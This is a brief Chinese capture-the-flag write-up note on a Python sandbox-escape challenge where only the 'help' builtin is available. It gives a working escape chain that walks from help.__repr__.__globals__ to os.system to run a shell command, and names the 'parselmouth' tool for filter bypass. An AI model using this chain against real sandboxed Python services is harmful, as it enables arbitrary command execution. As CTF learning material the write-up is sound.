这题区别于 `sandbox-v1`，可用 builtins 只剩一个 `help`

根据经验，经典的 exp 是：

```python
help.__repr__.__globals__['sys'].modules['os'].__dict__['system']('id')
```

原型有了，剩余 bypass 就交给 parselmouth 即可。
